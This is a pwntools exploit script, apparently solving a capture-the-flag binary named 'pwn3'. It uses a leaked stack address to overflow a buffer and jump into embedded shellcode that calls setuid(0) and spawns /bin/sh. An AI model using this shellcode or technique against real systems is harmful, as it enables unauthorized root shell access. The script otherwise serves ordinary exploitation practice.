from pwn import *
p = process('./pwn3')
gdbscript='''
b *echo+61
'''
gdb.attach(p, gdbscript=gdbscript)

print(p.recvuntil(b'journey '))
leak = str(p.recvline())
address = int(leak.strip("b'!\\n"), 16)

payload = b''
payload += b'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
payload += b'a'*(302-len(payload)) + p32(address)

print(payload)
p.sendline(payload)
p.interactive()
